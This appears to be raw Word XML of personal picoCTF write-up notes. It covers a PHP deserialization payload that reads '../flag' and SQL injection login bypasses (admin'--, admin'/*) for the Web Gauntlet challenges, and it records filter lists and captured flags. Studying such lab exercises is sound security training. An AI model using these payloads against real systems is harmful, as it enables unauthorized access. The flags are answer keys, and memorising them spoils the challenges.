          <w:szCs w:val="23"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>file_put_contents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 $data, FILE_APPEND);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C626A70"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4751E8EC"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 xml:space="preserve">function </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C6541D">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Segoe UI"/>
          <w:color w:val="232629"/>
          <w:kern w:val="0"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>read_log</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C6541D">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Segoe UI"/>
          <w:color w:val="232629"/>
          <w:kern w:val="0"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>() {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C617682"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r>
      <w:r w:rsidRPr="00C6541D">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Segoe UI"/>
          <w:color w:val="232629"/>
          <w:kern w:val="0"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:tab/>
        <w:t xml:space="preserve">return </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C6541D">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Segoe UI"/>
          <w:color w:val="232629"/>
          <w:kern w:val="0"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>file_get_contents</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C6541D">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Segoe UI"/>
          <w:color w:val="232629"/>
          <w:kern w:val="0"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>($this-&gt;</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C6541D">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Segoe UI"/>
          <w:color w:val="232629"/>
          <w:kern w:val="0"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>log_file</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C6541D">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Segoe UI"/>
          <w:color w:val="232629"/>
          <w:kern w:val="0"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="320C2BB9"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ab/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17F63186"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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AD6A8E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 xml:space="preserve">$perm = new </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C6541D">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Segoe UI"/>
          <w:color w:val="232629"/>
          <w:kern w:val="0"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>access_log</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C6541D">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Segoe UI"/>
          <w:color w:val="232629"/>
          <w:kern w:val="0"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>("../flag");</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="781BCF0F" w14:textId="77777777"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 (serialize($perm)); //O:10:"access_log":1:{s:8:"log_file";s:7:"../flag";}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="430AA400" w14:textId="77777777" w:rsid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echo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Segoe UI"/>
          <w:color w:val="232629"/>
          <w:kern w:val="0"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t xml:space="preserve"> b</w:t>
      </w:r>
      <w:r w:rsidRPr="00C6541D">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Segoe UI"/>
          <w:color w:val="232629"/>
          <w:kern w:val="0"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>ase64_encode(serialize($perm));</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DE3646A" w14:textId="5D95487C" w:rsidR="00C6541D" w:rsidRPr="00C6541D"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//TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo3OiIuLi9mbGFnIjt9</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CD44930" w14:textId="77901AFC" w:rsidR="00ED2DAF" w:rsidRDefault="00C6541D" w:rsidP="00C6541D">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C6541D">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Segoe UI"/>
          <w:color w:val="232629"/>
          <w:kern w:val="0"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>?&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="670882B6"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 Flag:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C8B7CDF" w14:textId="77777777" w:rsidR="00ED2DAF" w:rsidRPr="00ED2DAF"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0E5D8076" w14:textId="77777777" w:rsidR="00C6541D" w:rsidRDefault="00C6541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sidRPr="00C6541D">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Segoe UI"/>
          <w:color w:val="232629"/>
          <w:kern w:val="0"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>picoCTF</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C6541D">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Segoe UI"/>
          <w:color w:val="232629"/>
          <w:kern w:val="0"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t xml:space="preserve">{th15_vu1n_1s_5up3r_53r1ous_y4ll_c5123066}  </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D3ABA60" w14:textId="3BCD37B3" w:rsidR="0076788A" w:rsidRDefault="00ED2DAF"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ED2DAF">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Segoe UI"/>
          <w:color w:val="232629"/>
          <w:kern w:val="0"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>```</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4ADEA864" w14:textId="5AEEE06A"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1924256A" w14:textId="72210760" w:rsidR="00702A7D"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roofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Segoe UI"/>
          <w:color w:val="232629"/>
          <w:kern w:val="0"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Sql</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Segoe UI"/>
          <w:color w:val="232629"/>
          <w:kern w:val="0"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t xml:space="preserve"> injection</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="699F2BAB"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Web Gauntlet 2</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A5B3F67"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 | 170 points</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="399C04B2"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 xml:space="preserve">Tags: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="316CF5EF"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AUTHOR: MADSTACKS</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C23A06D"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DCE3DD4"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If the flag is not displayed after completing this challenge, try clearing your cookies. Cookies set by other challenges may prevent the flag from displaying properly.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C26CBC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67636781"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Description</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B86A923" w14:textId="77777777" w:rsidR="003C0B9B" w:rsidRPr="003C0B9B" w:rsidRDefault="003C0B9B" w:rsidP="003C0B9B">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This website looks familiar... Log in as admin Site: http://mercury.picoctf.net:61434/ Filter: http://mercury.picoctf.net:61434/filter.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7824E0BD" w14:textId="4D21B1D6" w:rsidR="003C0B9B" w:rsidRPr="003C0B9B" w:rsidRDefault="003C0B9B" w:rsidP="003C0B9B">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6"/>
        </w:num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Try any random username and password</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46917DFC" w14:textId="6B2B4DBD"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Pr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Segoe UI"/>
          <w:color w:val="232629"/>
          <w:kern w:val="0"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>We get:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1481B371" w14:textId="0FDA6BDF"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SELECT username, password FROM users WHERE username='ad' AND password='pass'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4968F2C6" w14:textId="5A366893"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3C0B9B">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Segoe UI"/>
          <w:color w:val="232629"/>
          <w:kern w:val="0"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>http://mercury.picoctf.net:61434/filter.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FA53EA9" w14:textId="77777777" w:rsidR="003C0B9B" w:rsidRPr="00A35726" w:rsidRDefault="003C0B9B" w:rsidP="003C0B9B">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00702A7D">
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>Filters: or and true false union like = &gt; &lt; ; -- /* */ admin</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C8C20C2" w14:textId="77777777" w:rsidR="003C0B9B" w:rsidRDefault="003C0B9B"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p>
    <w:p w14:paraId="3ECB9086" w14:textId="3E6F2F14" w:rsidR="00702A7D" w:rsidRPr="00A35726" w:rsidRDefault="00702A7D" w:rsidP="00ED2DAF">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8A4BFF" w14:textId="737F0FC0" w:rsidR="009A269F" w:rsidRDefault="00311F0B" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="6C8C34FB" wp14:editId="0169CD6E">
            <wp:extent cx="6332220" cy="294449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4"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6332220" cy="2944495"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="169BEB10" w14:textId="5FDD52C1" w:rsidR="009A269F" w:rsidRDefault="00702A7D" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00702A7D">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">// </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00702A7D">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>picoCTF</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00702A7D">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>{0n3_m0r3_t1m3_b55c7a5682db6cb0192b28772d4f4131}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C2C31B8" w14:textId="067C2694" w:rsidR="00E54A70" w:rsidRDefault="00E54A70" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5AEFF6D7" w14:textId="77777777" w:rsidR="003C0B9B" w:rsidRPr="003C0B9B" w:rsidRDefault="003C0B9B" w:rsidP="003C0B9B">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003C0B9B">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>Web Gauntlet</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42DD76FD"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 | 200 points</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="452A9C6E" w14:textId="77777777" w:rsidR="003C0B9B" w:rsidRPr="003C0B9B" w:rsidRDefault="003C0B9B" w:rsidP="003C0B9B">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003C0B9B">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">Tags: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EBFFD9B" w14:textId="77777777" w:rsidR="003C0B9B" w:rsidRPr="003C0B9B" w:rsidRDefault="003C0B9B" w:rsidP="003C0B9B">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003C0B9B">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>AUTHOR: MADSTACKS</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7670EE62" w14:textId="77777777" w:rsidR="003C0B9B" w:rsidRPr="003C0B9B" w:rsidRDefault="003C0B9B" w:rsidP="003C0B9B">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="657625F4" w14:textId="77777777" w:rsidR="003C0B9B" w:rsidRPr="003C0B9B" w:rsidRDefault="003C0B9B" w:rsidP="003C0B9B">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003C0B9B">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>If the flag is not displayed after completing this challenge, try clearing your cookies. Cookies set by other challenges may prevent the flag from displaying properly.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="009AE154" w14:textId="77777777" w:rsidR="003C0B9B" w:rsidRPr="003C0B9B" w:rsidRDefault="003C0B9B" w:rsidP="003C0B9B">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="50C30544" w14:textId="77777777" w:rsidR="003C0B9B" w:rsidRPr="003C0B9B" w:rsidRDefault="003C0B9B" w:rsidP="003C0B9B">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003C0B9B">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>Description</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64ADF2EB" w14:textId="3C44A3E0" w:rsidR="003C0B9B" w:rsidRDefault="003C0B9B" w:rsidP="003C0B9B">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003C0B9B">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">Can you beat the filters? Log in as admin http://jupiter.challenges.picoctf.org:19593/ </w:t>
      </w:r>
      <w:hyperlink r:id="rId135" w:history="1">
        <w:r w:rsidR="00903761" w:rsidRPr="00D5742F">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
            <w:lang w:val="en-CA"/>
          </w:rPr>
          <w:t>http://jupiter.challenges.picoctf.org:19593/filter.php</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="304FACC8" w14:textId="4F6BEB4D" w:rsidR="00903761" w:rsidRDefault="00903761" w:rsidP="003C0B9B">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>R</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>ound1 filter or</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42FF1FA3" w14:textId="77777777"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 xml:space="preserve">omment: -- </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B1C9A2F" w14:textId="26617543" w:rsidR="00903761" w:rsidRDefault="00903761" w:rsidP="003C0B9B">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>username: admi</w:t>
      </w:r>
      <w:r w:rsidRPr="00903761">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>n'</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>--</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1525D3D5" w14:textId="242767E1" w:rsidR="00903761" w:rsidRDefault="00903761" w:rsidP="003C0B9B">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00903761">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>SELECT * FROM users WHERE username='admin'--' AND password='</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00903761">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>ada</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00903761">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16C8E068" w14:textId="03DC5BD1" w:rsidR="00903761" w:rsidRDefault="00903761" w:rsidP="003C0B9B">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00903761">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>Round2: or and like = --</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37BB178D" w14:textId="65144868" w:rsidR="00903761" w:rsidRDefault="00903761" w:rsidP="003C0B9B">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>C</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>omment/*</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="562AAEB2" w14:textId="5A1BBA07" w:rsidR="00903761" w:rsidRDefault="00903761" w:rsidP="003C0B9B">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>U</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>sername:</w:t>
      </w:r>
      <w:r w:rsidRPr="00903761">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="AA759F"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="AA759F"/>
        </w:rPr>
        <w:t>admin'/*</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F05B675" w14:textId="74BC7E86" w:rsidR="00903761" w:rsidRDefault="00903761" w:rsidP="003C0B9B">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00903761">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>SELECT * FROM users WHERE username='admin'/*' AND password='a'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E4ECEAA" w14:textId="305B56DB" w:rsidR="00903761" w:rsidRDefault="00903761" w:rsidP="003C0B9B">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3B1FD637" w14:textId="68380E40" w:rsidR="00903761" w:rsidRDefault="00903761" w:rsidP="003C0B9B">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00903761">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>Round3: or and = like &gt; &lt; --</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49878D75" w14:textId="704AA408" w:rsidR="007C7A2D" w:rsidRDefault="007C7A2D" w:rsidP="003C0B9B">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="52C9B67C"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1 - filter: or</w:t>
      </w:r>
    </w:p>
